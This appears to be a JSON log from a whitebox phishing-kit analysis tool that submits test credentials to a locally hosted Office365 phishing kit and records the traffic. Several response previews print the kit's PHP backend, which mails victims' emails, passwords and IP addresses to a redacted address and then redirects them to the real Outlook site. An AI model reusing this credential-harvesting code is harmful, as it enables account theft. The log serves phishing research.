@@ -1,0 +1,1680 @@
+{
+  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/",
+  "timestamp": "2026-05-03 12:00:23",
+  "mode": "whitebox",
+  "kit_path": "/var/www/html/phishing_kit_uncompress_20250519/2021-09-27_office",
+  "pages": [
+    {
+      "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+      "forms": [
+        {
+          "action": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+          "method": "post",
+          "xpath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[2]/form",
+          "registered_handlers": [],
+          "fields": [
+            {
+              "name": "username",
+              "type": "email",
+              "xpath": "//*[@id=\"cred_userid_inputtext\"]",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            },
+            {
+              "name": "passwd",
+              "type": "password",
+              "xpath": "//*[@id=\"cred_password_inputtext\"]",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            }
+          ],
+          "submit_log": {
+            "enter_key_test": {
+              "skipped": true,
+              "reason": "network_only"
+            },
+            "enter_key_logs": {},
+            "native_submit": {
+              "form_meta": {
+                "action": "office.php",
+                "enctype": "application/x-www-form-urlencoded",
+                "id": "",
+                "method": "POST",
+                "name": ""
+              },
+              "cdp_reqs": [
+                {
+                  "requestId": "0E95D47B36C91E15CA1B33E519E27351",
+                  "sequence": 1,
+                  "resourceType": "Document",
+                  "initiatorType": "other",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "no-cache",
+                    "Connection": "keep-alive",
+                    "Content-Length": "44",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "www.2026.com:8080",
+                    "Origin": "http://www.2026.com:8080",
+                    "Pragma": "no-cache",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Accept",
+                    "Accept-Encoding",
+                    "Accept-Language",
+                    "Cache-Control",
+                    "Connection",
+                    "Content-Length",
+                    "Content-Type",
+                    "Host",
+                    "Origin",
+                    "Pragma",
+                    "Referer",
+                    "Upgrade-Insecure-Requests",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": false,
+                  "associatedCookies": [],
+                  "customRequestHeaders": {},
+                  "postData": "username=cpaz%40tesq.com&passwd=kQZhGdxtp3UT",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "391",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Sun, 03 May 2026 03:00:27 GMT",
+                    "Keep-Alive": "timeout=5, max=77",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"-----------  ! +Citi LOGIN ! xDD+ !  -----------\\n\";\r\n$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";\r\n$message .= \"Email Address        : \".$_POST['username'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['passwd'].\"\\n\";\r\n$message .= \"IP Address             : \".$ip.\"\\n\";\r\n$message .= \"-----------  ! +nJoY+ !  -----------\\n\";\r\n$send = \"[REDACTED_EMAIL_3f09c76d]\";\r\n\r\n$subject = \"Office365 logs xD $ip\";\r\n$headers = \"From:  El Patron<[REDACTED_EMAIL_0ad5510e]>\";\r\n$headers .= $_POST['eMailAdd'].\"\\n\";\r\n$headers .= \"MIME-Version: 1.0\\n\";\r\n$arr=array($send, $IP);\r\nforeach ($arr as $send)\r\nmail($send,$subject,$message,$headers);\r\n\r\n\r\nheader(\"Location: https://outlook.office.com\");",
+                  "responseBodyLength": 746,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 642,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 22853.710775,
+                  "lastEventTs": 1777777227979,
+                  "requestSentTs": 22853.710775,
+                  "responseReceivedTs": 22853.714474,
+                  "loadingFinishedTs": 22853.714131,
+                  "latencyMs": 3.4,
+                  "ttfbMs": 3.7,
+                  "_native_submit": true,
+                  "_submit_trigger_ts_ms": 1777777227912
+                }
+              ],
+              "note": "native browser submit observed via CDP only; JS context may have been destroyed by navigation"
+            },
+            "submit_click_logs": {
+              "step": 1,
+              "phase": "submit_click",
+              "domChanges": [],
+              "networkReqs": [
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "type": "xhr",
+                  "method": "POST",
+                  "url": "office.php",
+                  "requestHeaders": {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                  },
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "requestBody": "username=dkgt%40tesq.com&passwd=S1mW286",
+                  "callStack": "Error: __fa_xhr_trace\n    at XMLHttpRequest.send (<anonymous>:198:17)\n    at HTMLDocument.eval (eval at executeScript (:416:16), <anonymous>:58:25)",
+                  "status": 200,
+                  "response": "<?\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"-----------  ! +Citi LOGIN ! xDD+ !  -----------\\n\";\r\n$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";\r\n$message .= \"Email Address        : \".$_POST['username'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['passwd'].\"\\n\";\r\n$message .= \"IP Address             : \".$ip.\"\\n\";\r\n$message .= \"-----------  ! +nJoY+ !  -----------\\n\";\r\n$send = \"[REDACTED_EMAIL_3f09c76d]\";\r\n\r\n$subject = \"Office365 logs xD $ip\";\r\n$headers = \"From:  El Patron<[REDACTED_EMAIL_0ad5510e]>\";\r\n$headers .= $_POST['eMailAdd'].\"\\n\";\r\n$headers .= \"MIME-Version: 1.0\\n\";\r\n$arr=array($send, $IP);\r\nforeach ($arr as $send)\r\nmail($send,$subject,$message,$headers);\r\n\r\n\r\nheader(\"Location: https://outlook.office.com\");",
+                  "responseHeaders": {
+                    "connection": "Keep-Alive",
+                    "content-encoding": "gzip",
+                    "content-length": "391",
+                    "content-type": "text/html; charset=UTF-8",
+                    "date": "Sun, 03 May 2026 03:00:30 GMT",
+                    "keep-alive": "timeout=5, max=74",
+                    "server": "Apache/2.4.58 (Ubuntu)",
+                    "vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "responseReturned": true,
+                  "redirected": true,
+                  "finalUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+                  "responseBodyLength": 746,
+                  "timestamp": 1777777230961,
+                  "latencyMs": 4,
+                  "ttfbMs": null,
+                  "resolved_server": {
+                    "server_file": "office/office.php",
+                    "receives_fields": [
+                      "eMailAdd",
+                      "passwd",
+                      "username"
+                    ],
+                    "actions": [
+                      {
+                        "type": "mail",
+                        "target": "[REDACTED_EMAIL]",
+                        "variable": "$send",
+                        "line": 17
+                      },
+                      {
+                        "type": "redirect",
+                        "target": "https://outlook.office.com",
+                        "line": 20
+                      }
+                    ],
+                    "exfil": [
+                      "email:[REDACTED_EMAIL]"
+                    ]
+                  }
+                }
+              ],
+              "firedEvents": [
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mouseover",
+                  "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[4]/input",
+                  "targetTag": "INPUT",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "Sign in",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777777230959
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mousedown",
+                  "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[4]/input",
+                  "targetTag": "INPUT",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "Sign in",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777777230959
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "focus",
+                  "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[4]/input",
+                  "targetTag": "INPUT",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "Sign in",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777777230959
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "mouseup",
+                  "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[4]/input",
+                  "targetTag": "INPUT",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "Sign in",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777777230960
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "click",
+                  "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[4]/input",
+                  "targetTag": "INPUT",
+                  "targetName": "",
+                  "targetType": "submit",
+                  "targetValue": "Sign in",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777777230960
+                },
+                {
+                  "step": 1,
+                  "phase": "submit_click",
+                  "eventType": "submit",
+                  "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[2]/form",
+                  "targetTag": "FORM",
+                  "targetName": "",
+                  "targetType": "",
+                  "targetValue": "",
+                  "key": null,
+                  "keyCode": null,
+                  "defaultPrevented": false,
+                  "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+                  "timestamp": 1777777230961
+                }
+              ],
+              "html5Validation": [],
+              "triggeredFunctions": [],
+              "cdpNetworkReqs": [
+                {
+                  "requestId": "80455.44",
+                  "sequence": 10,
+                  "resourceType": "XHR",
+                  "initiatorType": "script",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Content-Type",
+                    "Referer",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": false,
+                  "associatedCookies": [],
+                  "customRequestHeaders": {},
+                  "postData": "username=dkgt%40tesq.com&passwd=S1mW286",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "391",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Sun, 03 May 2026 03:00:30 GMT",
+                    "Keep-Alive": "timeout=5, max=74",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"-----------  ! +Citi LOGIN ! xDD+ !  -----------\\n\";\r\n$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";\r\n$message .= \"Email Address        : \".$_POST['username'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['passwd'].\"\\n\";\r\n$message .= \"IP Address             : \".$ip.\"\\n\";\r\n$message .= \"-----------  ! +nJoY+ !  -----------\\n\";\r\n$send = \"[REDACTED_EMAIL_3f09c76d]\";\r\n\r\n$subject = \"Office365 logs xD $ip\";\r\n$headers = \"From:  El Patron<[REDACTED_EMAIL_0ad5510e]>\";\r\n$headers .= $_POST['eMailAdd'].\"\\n\";\r\n$headers .= \"MIME-Version: 1.0\\n\";\r\n$arr=array($send, $IP);\r\nforeach ($arr as $send)\r\nmail($send,$subject,$message,$headers);\r\n\r\n\r\nheader(\"Location: https://outlook.office.com\");",
+                  "responseBodyLength": 746,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 642,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 22856.706547,
+                  "lastEventTs": 1777777231467,
+                  "requestSentTs": 22856.706547,
+                  "responseReceivedTs": 22856.709223,
+                  "loadingFinishedTs": 22856.708705,
+                  "latencyMs": 2.2,
+                  "ttfbMs": 2.7,
+                  "_timing_summary": {
+                    "latencyMs": 2.2,
+                    "ttfbMs": 2.7,
+                    "protocol": "http/1.1",
+                    "redirected": false,
+                    "redirectChain": [],
+                    "status": 200,
+                    "hasCookieHeader": false,
+                    "hasSetCookie": false
+                  }
+                }
+              ],
+              "jqueryDispatchLogs": []
+            },
+            "submit_trigger_ts_ms": 1777777230918,
+            "submit_timing": {
+              "python_click_ts_ms": 1777777230918,
+              "js_trigger_event_ts_ms": 1777777230960,
+              "js_first_req_ts_ms": 1777777230961,
+              "event_to_request_ms": 1,
+              "cdp_req_count": 1
+            },
+            "submit_detail": {
+              "action": "office.php",
+              "fields": {
+                "passwd": "S1mW286",
+                "username": "dkgt@tesq.com"
+              },
+              "method": "POST",
+              "responseContentType": "text/html; charset=UTF-8",
+              "responseLength": 746,
+              "status": 200,
+              "submitted": true,
+              "cdp_network": [
+                {
+                  "requestId": "80455.44",
+                  "sequence": 10,
+                  "resourceType": "XHR",
+                  "initiatorType": "script",
+                  "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+                  "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+                  "method": "POST",
+                  "requestHeaders": {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                  },
+                  "requestHeaderNames": [
+                    "Content-Type",
+                    "Referer",
+                    "User-Agent"
+                  ],
+                  "requestContentType": "application/x-www-form-urlencoded",
+                  "hasCookieHeader": false,
+                  "associatedCookies": [],
+                  "customRequestHeaders": {},
+                  "postData": "username=dkgt%40tesq.com&passwd=S1mW286",
+                  "status": 200,
+                  "statusText": "OK",
+                  "redirected": false,
+                  "redirectChain": [],
+                  "redirectLocation": "",
+                  "responseHeaders": {
+                    "Connection": "Keep-Alive",
+                    "Content-Encoding": "gzip",
+                    "Content-Length": "391",
+                    "Content-Type": "text/html; charset=UTF-8",
+                    "Date": "Sun, 03 May 2026 03:00:30 GMT",
+                    "Keep-Alive": "timeout=5, max=74",
+                    "Server": "Apache/2.4.58 (Ubuntu)",
+                    "Vary": "Accept-Encoding"
+                  },
+                  "responseContentType": "text/html; charset=UTF-8",
+                  "hasSetCookie": false,
+                  "responseReturned": true,
+                  "responseBodyPreview": "<?\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"-----------  ! +Citi LOGIN ! xDD+ !  -----------\\n\";\r\n$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";\r\n$message .= \"Email Address        : \".$_POST['username'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['passwd'].\"\\n\";\r\n$message .= \"IP Address             : \".$ip.\"\\n\";\r\n$message .= \"-----------  ! +nJoY+ !  -----------\\n\";\r\n$send = \"[REDACTED_EMAIL_3f09c76d]\";\r\n\r\n$subject = \"Office365 logs xD $ip\";\r\n$headers = \"From:  El Patron<[REDACTED_EMAIL_0ad5510e]>\";\r\n$headers .= $_POST['eMailAdd'].\"\\n\";\r\n$headers .= \"MIME-Version: 1.0\\n\";\r\n$arr=array($send, $IP);\r\nforeach ($arr as $send)\r\nmail($send,$subject,$message,$headers);\r\n\r\n\r\nheader(\"Location: https://outlook.office.com\");",
+                  "responseBodyLength": 746,
+                  "loadingFinished": true,
+                  "loadingFailed": false,
+                  "errorText": "",
+                  "encodedDataLength": 642,
+                  "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+                  "mimeType": "text/html",
+                  "protocol": "http/1.1",
+                  "timestamp": 22856.706547,
+                  "lastEventTs": 1777777231467,
+                  "requestSentTs": 22856.706547,
+                  "responseReceivedTs": 22856.709223,
+                  "loadingFinishedTs": 22856.708705,
+                  "latencyMs": 2.2,
+                  "ttfbMs": 2.7,
+                  "_timing_summary": {
+                    "latencyMs": 2.2,
+                    "ttfbMs": 2.7,
+                    "protocol": "http/1.1",
+                    "redirected": false,
+                    "redirectChain": [],
+                    "status": 200,
+                    "hasCookieHeader": false,
+                    "hasSetCookie": false
+                  }
+                }
+              ]
+            }
+          },
+          "overall_classification": "Case B: Server Round-trip (AJAX)",
+          "field_stats": {
+            "dom_analysable": 2,
+            "visible_now": 2,
+            "hidden_or_collapsed": 0
+          },
+          "static_action_analysis": {
+            "server_file": "office/office.php",
+            "receives_fields": [
+              "eMailAdd",
+              "passwd",
+              "username"
+            ],
+            "actions": [
+              {
+                "type": "mail",
+                "target": "[REDACTED_EMAIL]",
+                "variable": "$send",
+                "line": 17
+              },
+              {
+                "type": "redirect",
+                "target": "https://outlook.office.com",
+                "line": 20
+              }
+            ],
+            "exfil": [
+              "email:[REDACTED_EMAIL]"
+            ]
+          },
+          "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html"
+        }
+      ]
+    }
+  ],
+  "forms": [
+    {
+      "action": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+      "method": "post",
+      "xpath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[2]/form",
+      "registered_handlers": [],
+      "fields": [
+        {
+          "name": "username",
+          "type": "email",
+          "xpath": "//*[@id=\"cred_userid_inputtext\"]",
+          "typing_log": [],
+          "backspace_log": {},
+          "other_log": {},
+          "classification": ""
+        },
+        {
+          "name": "passwd",
+          "type": "password",
+          "xpath": "//*[@id=\"cred_password_inputtext\"]",
+          "typing_log": [],
+          "backspace_log": {},
+          "other_log": {},
+          "classification": ""
+        }
+      ],
+      "submit_log": {
+        "enter_key_test": {
+          "skipped": true,
+          "reason": "network_only"
+        },
+        "enter_key_logs": {},
+        "native_submit": {
+          "form_meta": {
+            "action": "office.php",
+            "enctype": "application/x-www-form-urlencoded",
+            "id": "",
+            "method": "POST",
+            "name": ""
+          },
+          "cdp_reqs": [
+            {
+              "requestId": "0E95D47B36C91E15CA1B33E519E27351",
+              "sequence": 1,
+              "resourceType": "Document",
+              "initiatorType": "other",
+              "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+              "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+              "method": "POST",
+              "requestHeaders": {
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "Accept-Encoding": "gzip, deflate",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Cache-Control": "no-cache",
+                "Connection": "keep-alive",
+                "Content-Length": "44",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "www.2026.com:8080",
+                "Origin": "http://www.2026.com:8080",
+                "Pragma": "no-cache",
+                "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/index.html",
+                "Upgrade-Insecure-Requests": "1",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+              },
+              "requestHeaderNames": [
+                "Accept",
+                "Accept-Encoding",
+                "Accept-Language",
+                "Cache-Control",
+                "Connection",
+                "Content-Length",
+                "Content-Type",
+                "Host",
+                "Origin",
+                "Pragma",
+                "Referer",
+                "Upgrade-Insecure-Requests",
+                "User-Agent"
+              ],
+              "requestContentType": "application/x-www-form-urlencoded",
+              "hasCookieHeader": false,
+              "associatedCookies": [],
+              "customRequestHeaders": {},
+              "postData": "username=cpaz%40tesq.com&passwd=kQZhGdxtp3UT",
+              "status": 200,
+              "statusText": "OK",
+              "redirected": false,
+              "redirectChain": [],
+              "redirectLocation": "",
+              "responseHeaders": {
+                "Connection": "Keep-Alive",
+                "Content-Encoding": "gzip",
+                "Content-Length": "391",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Date": "Sun, 03 May 2026 03:00:27 GMT",
+                "Keep-Alive": "timeout=5, max=77",
+                "Server": "Apache/2.4.58 (Ubuntu)",
+                "Vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "hasSetCookie": false,
+              "responseReturned": true,
+              "responseBodyPreview": "<?\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"-----------  ! +Citi LOGIN ! xDD+ !  -----------\\n\";\r\n$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";\r\n$message .= \"Email Address        : \".$_POST['username'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['passwd'].\"\\n\";\r\n$message .= \"IP Address             : \".$ip.\"\\n\";\r\n$message .= \"-----------  ! +nJoY+ !  -----------\\n\";\r\n$send = \"[REDACTED_EMAIL_3f09c76d]\";\r\n\r\n$subject = \"Office365 logs xD $ip\";\r\n$headers = \"From:  El Patron<[REDACTED_EMAIL_0ad5510e]>\";\r\n$headers .= $_POST['eMailAdd'].\"\\n\";\r\n$headers .= \"MIME-Version: 1.0\\n\";\r\n$arr=array($send, $IP);\r\nforeach ($arr as $send)\r\nmail($send,$subject,$message,$headers);\r\n\r\n\r\nheader(\"Location: https://outlook.office.com\");",
+              "responseBodyLength": 746,
+              "loadingFinished": true,
+              "loadingFailed": false,
+              "errorText": "",
+              "encodedDataLength": 642,
+              "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+              "mimeType": "text/html",
+              "protocol": "http/1.1",
+              "timestamp": 22853.710775,
+              "lastEventTs": 1777777227979,
+              "requestSentTs": 22853.710775,
+              "responseReceivedTs": 22853.714474,
+              "loadingFinishedTs": 22853.714131,
+              "latencyMs": 3.4,
+              "ttfbMs": 3.7,
+              "_native_submit": true,
+              "_submit_trigger_ts_ms": 1777777227912
+            }
+          ],
+          "note": "native browser submit observed via CDP only; JS context may have been destroyed by navigation"
+        },
+        "submit_click_logs": {
+          "step": 1,
+          "phase": "submit_click",
+          "domChanges": [],
+          "networkReqs": [
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "type": "xhr",
+              "method": "POST",
+              "url": "office.php",
+              "requestHeaders": {
+                "Content-Type": "application/x-www-form-urlencoded"
+              },
+              "requestContentType": "application/x-www-form-urlencoded",
+              "requestBody": "username=dkgt%40tesq.com&passwd=S1mW286",
+              "callStack": "Error: __fa_xhr_trace\n    at XMLHttpRequest.send (<anonymous>:198:17)\n    at HTMLDocument.eval (eval at executeScript (:416:16), <anonymous>:58:25)",
+              "status": 200,
+              "response": "<?\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"-----------  ! +Citi LOGIN ! xDD+ !  -----------\\n\";\r\n$message .= \"-----------  ! +Account infoS+ !  -----------\\n\";\r\n$message .= \"Email Address        : \".$_POST['username'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['passwd'].\"\\n\";\r\n$message .= \"IP Address             : \".$ip.\"\\n\";\r\n$message .= \"-----------  ! +nJoY+ !  -----------\\n\";\r\n$send = \"[REDACTED_EMAIL_3f09c76d]\";\r\n\r\n$subject = \"Office365 logs xD $ip\";\r\n$headers = \"From:  El Patron<[REDACTED_EMAIL_0ad5510e]>\";\r\n$headers .= $_POST['eMailAdd'].\"\\n\";\r\n$headers .= \"MIME-Version: 1.0\\n\";\r\n$arr=array($send, $IP);\r\nforeach ($arr as $send)\r\nmail($send,$subject,$message,$headers);\r\n\r\n\r\nheader(\"Location: https://outlook.office.com\");",
+              "responseHeaders": {
+                "connection": "Keep-Alive",
+                "content-encoding": "gzip",
+                "content-length": "391",
+                "content-type": "text/html; charset=UTF-8",
+                "date": "Sun, 03 May 2026 03:00:30 GMT",
+                "keep-alive": "timeout=5, max=74",
+                "server": "Apache/2.4.58 (Ubuntu)",
+                "vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "responseReturned": true,
+              "redirected": true,
+              "finalUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2021-09-27_office/office/office.php",
+              "responseBodyLength": 746,
+              "timestamp": 1777777230961,
+              "latencyMs": 4,
+              "ttfbMs": null,
+              "resolved_server": {
+                "server_file": "office/office.php",
+                "receives_fields": [
+                  "eMailAdd",
+                  "passwd",
+                  "username"
+                ],
+                "actions": [
+                  {
+                    "type": "mail",
+                    "target": "[REDACTED_EMAIL]",
+                    "variable": "$send",
+                    "line": 17
+                  },
+                  {
+                    "type": "redirect",
+                    "target": "https://outlook.office.com",
+                    "line": 20
+                  }
+                ],
+                "exfil": [
+                  "email:[REDACTED_EMAIL]"
+                ]
+              }
+            }
+          ],
+          "firedEvents": [
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "mouseover",
+              "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[4]/input",
+              "targetTag": "INPUT",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "Sign in",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1777777230959
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "mousedown",
+              "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[4]/input",
+              "targetTag": "INPUT",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "Sign in",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1777777230959
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "focus",
+              "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[4]/input",
+              "targetTag": "INPUT",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "Sign in",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1777777230959
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "mouseup",
+              "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[4]/input",
+              "targetTag": "INPUT",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "Sign in",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1777777230960
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "click",
+              "targetXPath": "/html/body/div[4]/table/tbody/tr/td/div[2]/div/ul/li[4]/input",
+              "targetTag": "INPUT",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "Sign in",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
